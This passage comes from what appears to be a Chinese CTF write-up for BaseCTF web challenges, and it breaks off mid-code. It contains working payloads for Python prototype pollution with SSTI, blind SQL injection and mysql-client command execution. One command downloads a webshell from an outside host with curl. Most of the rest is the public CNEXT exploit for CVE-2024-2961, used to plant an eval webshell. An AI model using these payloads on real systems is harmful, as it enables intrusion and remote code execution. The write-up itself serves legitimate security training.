punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"你有什么想创造的吗？"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span></code></pre><p>进入题目，根据提示之间前往**&#x2F;flag<strong>，可以得到部分源码以及提示。根据代码可知在</strong>&#x2F;m4G1c<strong>路由下存在着导致原型链污染的</strong>merge<strong>函数，再结合其它提示可知此处是要污染</strong>heaven.py<strong>的</strong>create<strong>函数的</strong><strong>kwdefaults</strong><strong>属性，该属性存储的是仅关键字参数，即位于</strong><em><strong>之后的参数。由于</strong>create</em><em>函数在另一个模块中，我们需要利用<strong>sys</strong>模块的<strong>modules</strong>属性来获取到<strong>heaven.py</strong>，但是代码中并没有导入<strong>sys</strong>模块。那么该怎么获取到这个模块呢？在python中存在着*</em><strong>spec</strong><strong>内置属性，包含了关于类加载时的信息，定义在Lib&#x2F;importlib&#x2F;_bootstrap.py的类ModuleSpec，所以可以直接采用</strong>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]**获取到sys模块，此处就可以使用json模块获取，最终的payload如下</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"__init__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__globals__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"json"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"__spec__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"sys"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"modules"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                    <span class="token property">"heaven"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                        <span class="token property">"create"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                              <span class="token property">"__kwdefaults__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                              <span class="token property">"confirm"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                                              <span class="token property">"lucky_number"</span> <span class="token operator">:</span> <span class="token string">"5346"</span>                                             <span class="token punctuation">&#125;</span>                                         <span class="token punctuation">&#125;</span>                                    <span class="token punctuation">&#125;</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>成功污染后去指定目录进行常规的ssti注入即可</p><pre class="language-json" data-language="json"><code class="language-json">flag=<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler.__init__.__globals__.os.popen('cat /flag').read()<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|;|@|\n/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有sql注入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//flag in ctf.flag</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';"</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 没有select，让你执行一句又如何 没有select，让你执行一句又如何 </span></code></pre><p>虽然ban了select 但是可以使用show来查看表名和列名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token comment"># Tables_in_ctf flag </span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> flag <span class="token comment"># id data</span></code></pre><p>使用语句<code>delete from flag where data like &#39;f%&#39; and sleep(5)</code>来进行注入，如果like成功匹配到，and字段会对后面的语句进行处理，如果like匹配不到（返回false）and后语句则不会进行处理，因为sleep()函数返回值为null，因此整个where的判断永假</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:37210/"</span>sqlstr <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token string">"&#123;&#125;"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> sqlstr<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"delete from flag where data like '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>s<span class="token punctuation">&#125;</span></span><span class="token string">%' and sleep(5)"</span></span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"sql"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            flag <span class="token operator">+=</span> s            <span class="token keyword">break</span></code></pre><h4 id="RCE-or-Sql-Inject-mysql"><a href="#RCE-or-Sql-Inject-mysql" class="headerlink" title="RCE or Sql Inject(mysql ? )"></a>RCE or Sql Inject(mysql ? )</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|;|@|del|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有sql注入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre><p>相比上一道题多过滤了se，ec，del，into，outfile。但是把换行放出来了。并且题目的语句多了个注释在末尾。</p><p>题目是一个比较冷门的考点，mysql命令行程序的命令执行，常见于mysql有suid时的提权</p><p>hint3中提示输个问号看看，先换行逃过注释，然后一个?也就是<code>sql=%0a?</code></p><p><img src="sql2.png" loading="lazy"></p><p>所以可以使用system进行rce了，但flag不在根目录，下个马进来好了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>sql<span class="token operator">=</span><span class="token operator">%</span><span class="token number">0</span>asystem curl hsad<span class="token operator">.</span>xyz<span class="token operator">/</span>hsad<span class="token operator">.</span>txt <span class="token operator">-</span>o hsad<span class="token operator">.</span>php</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">hsad</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'mysql -u root -p123456 -e "use ctf;show tables;select * from flag"'</span><span class="token punctuation">)</span></code></pre><p>也可以直接env就有flag</p><h4 id="Sql-Inject-or-RCE-delimiter-handler"><a href="#Sql-Inject-or-RCE-delimiter-handler" class="headerlink" title="Sql Inject or RCE(delimiter handler)"></a>Sql Inject or RCE(delimiter handler)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|st|;|@|delete|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有sql注入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre><p>加了<code>st</code>过滤 不能使用system了，并且del换成了delete。所以关键点会在del上吗<del>（存疑，</del>确信</p><p>发现mysql的内置命令里面有一条正好和del有关<code>delimiter</code>。可以利用delimiter来更改一条sql语句的结束符</p><p><img src="sql3.png" loading="lazy"></p><p>那么这道题就可以用这种方法来打堆叠注入，由于select被禁用无法查看flag，可以使用handler读表的方式来绕过，需要注意的是handler读的时候read first中first被禁用，可以使用read next来绕过</p><p>Payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?sql&#x3D;%0adelimiter hsad%0ahandler flag openhsad%0ahandler flag read next</code></pre><p><strong>handler</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 打开一个表名为 tbl_name 的表的句柄HANDLER tbl_name OPEN [ [AS] alias]# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]# 2、通过索引查看表# FIRST: 获取第一行（索引最小的一行）# NEXT: 获取下一行# PREV: 获取上一行# LAST: 获取最后一行（索引最大的一行）HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]# 3、不通过索引查看表# READ FIRST: 获取句柄的第一行# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]# 关闭已打开的句柄HANDLER tbl_name CLOSE</code></pre><h4 id="Just-Readme-前置-CVE-2024-2961"><a href="#Just-Readme-前置-CVE-2024-2961" class="headerlink" title="Just Readme (前置)(CVE-2024-2961)"></a>Just Readme (前置)(CVE-2024-2961)</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://github.com/ambionics/cnext-exploits">CVE-2024-2961</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 cnext-exploit.py http://challenge.basectf.fun:44169/ <span class="token string">"echo '&lt;?php eval(\<span class="token variable">$_POST</span>[0]);?>'>/var/www/html/hsad.php;"</span></code></pre><p><strong>cnext-exploit.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment">#</span><span class="token comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><span class="token comment"># Date: 2024-05-27</span><span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><span class="token comment">#</span><span class="token comment"># TODO Parse LIBC to know if patched</span><span class="token comment">#</span><span class="token comment"># INFORMATIONS</span><span class="token comment">#</span><span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><span class="token comment">#</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST['file']);    echo "File contents: $data";    ```        Tweak it to fit your target, and start the exploit.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> path<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token comment"># 匹配语句记得根据题目环境更改</span>        <span class="token comment"># data = response.re.search(b"(.*)", flags=re.S).group(1)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>text        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>                <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token 